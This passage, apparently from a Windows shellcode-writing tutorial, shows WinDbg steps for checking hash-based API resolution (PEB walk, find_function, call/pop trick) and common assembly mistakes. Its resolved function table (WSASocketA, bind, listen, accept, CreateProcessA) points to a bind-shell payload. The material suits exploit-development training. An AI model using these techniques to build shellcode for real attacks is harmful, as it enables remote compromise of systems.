; ESI should point to a name string during hash computation
0:000> da esi
7c8262c0  "ActivateActCtx"    ; whatever name is being processed
```

### Step 3: Verify Hash Match

```
; At hash_done (after computing hash of current name):
0:000> r edx
edx=ec0e4e8e           ; should match LoadLibraryA hash (0xEC0E4E8E)
                        ; if this is the right iteration

; Confirm target hash on stack:
0:000> dd esp+0x34 L1  ; offset depends on your find_function implementation
xxxx  ec0e4e8e         ; matches → branch will be taken
```

### Step 4: Verify Resolved Function VA

```
; After find_function returns, EAX = function VA
0:000> r eax
eax=7c801d7b

0:000> ln eax
(7c801d7b)   kernel32!LoadLibraryA    ← confirmed

; Alternative: check symbol directly
0:000> x kernel32!LoadLibraryA
7c801d7b kernel32!LoadLibraryA = <no type information>
; Compare with EAX — should match
```

### Step 5: View the Complete Function Pointer Table

```
; After all resolutions complete:
; EBP holds the frame pointer; function pointers start at [EBP-0x04]
0:000> dps ebp-0x40 L10
ebp-40   xxxxxxxx kernel32!VirtualAlloc
ebp-3c   xxxxxxxx (unused or CloseHandle)
ebp-38   xxxxxxxx (unused or VirtualAlloc)
ebp-34   xxxxxxxx kernel32!VirtualAlloc
ebp-30   xxxxxxxx (unused)
ebp-2c   xxxxxxxx kernel32!GetLastError
ebp-28   xxxxxxxx kernel32!CreateProcessA
ebp-24   xxxxxxxx WS2_32!accept
ebp-20   xxxxxxxx WS2_32!listen
ebp-1c   xxxxxxxx WS2_32!bind
ebp-18   xxxxxxxx WS2_32!WSASocketA
ebp-14   xxxxxxxx WS2_32!WSAStartup
ebp-10   xxxxxxxx kernel32!TerminateProcess
ebp-0c   xxxxxxxx kernel32!GetProcAddress
ebp-08   xxxxxxxx kernel32!LoadLibraryA
ebp-04   xxxxxxxx (find_function address)
; Each line shows: address | value | resolved symbol name
```

The `dps` command automatically resolves pointers to their nearest symbol — a fast sanity check that every slot was filled with the correct function.

---

## Common Mistakes

### Mistake 1: Calling find_function Before Setting EBX

`find_function` reads `[EBX + offset]` on its very first instruction. If EBX does not hold the correct module base, the first memory read will access wrong or unmapped memory.

**Wrong**: calling `find_function` before completing PEB walk to find kernel32.

**Correct**: PEB walk → set EBX to kernel32 DllBase → then call `find_function`.

Symptom: access violation at the first `mov eax, [ebx + 0x3C]` inside find_function.

### Mistake 2: Stack Imbalance After cdecl Calls

`find_function` as shown uses a custom calling convention (arguments pushed by caller, callee uses `RET 0x08` to clean 2 args = 8 bytes). If you change the convention to cdecl (callee does NOT clean args), you must add `add esp, 0x08` after every call to find_function.

**Wrong (cdecl version without cleanup)**:
```nasm
push  0xEC0E4E8E      ; hash
push  ebx             ; module base
call  dword ptr [ebp - 0x04]   ; find_function (cdecl version)
; ← missing: add esp, 0x08
; ESP now points 8 bytes below where it should
; next push goes to wrong address
; next call uses wrong return address
```

**Correct (cdecl version with cleanup)**:
```nasm
push  0xEC0E4E8E
push  ebx
call  dword ptr [ebp - 0x04]
add   esp, 0x08       ; clean 2 args × 4 bytes
```

### Mistake 3: The Call/Pop Trick Broken by Inserted Bytes

The call/pop trick works ONLY if `find_function` immediately follows the `CALL` instruction at the byte level. If any bytes (including NOP padding, alignment bytes, or assembler-inserted prefixes) appear between `CALL find_function_ret` and the `PUSHAD` of find_function, the address pushed by CALL will not be the start of find_function.

**Wrong**:
```nasm
get_find_function_ptr:
    call  find_function_ret     ; pushes address of next byte
    nop                         ; ← ONE NOP breaks everything
    nop                         ; address pushed = start of NOPs, not find_function
find_function:
    pushad                      ; find_function actually starts here
```

**Correct**: Absolutely no bytes between `CALL` and `find_function`'s first instruction:
```nasm
get_find_function_ptr:
    call  find_function_ret
find_function:
    pushad                      ; this MUST be the very next byte
```

In NASM: use `nop`-free code and verify with `objdump -d` or WinDbg that the `CALL` and `PUSHAD` are consecutive.

### Mistake 4: x64 — Omitting 32-Byte Shadow Space

On x64, calling any Win64 function without the 32-byte shadow space causes the callee to corrupt stack memory that belongs to the caller.

The bug is silent for many functions that do not spill arguments — until a function that does use the shadow space is called, at which point it writes into the caller's local variables (EBP frame).

**Symptom**: function pointer table values get corrupted after a specific API call. Values at `[rbp+0x00]` through `[rbp+0x18]` get overwritten with what look like function arguments.

**Correct**: every Win64 API call must be bracketed:
```nasm
sub  rsp, 0x20        ; allocate shadow space
call qword ptr [rbp + offset]
add  rsp, 0x20        ; clean shadow space
```

### Mistake 5: Not Saving/Restoring the Module Base Between Iterations

When calling `find_function` multiple times (once per function to resolve), the second call requires EBX to still hold the module base. If find_function clobbers EBX internally (even temporarily), or if between calls EBX gets modified by other code, the second resolution will fail.

**Correct**: use `pushad/popad` inside find_function so all registers are preserved. Verify with `ln ebx` in WinDbg before each call to find_function.
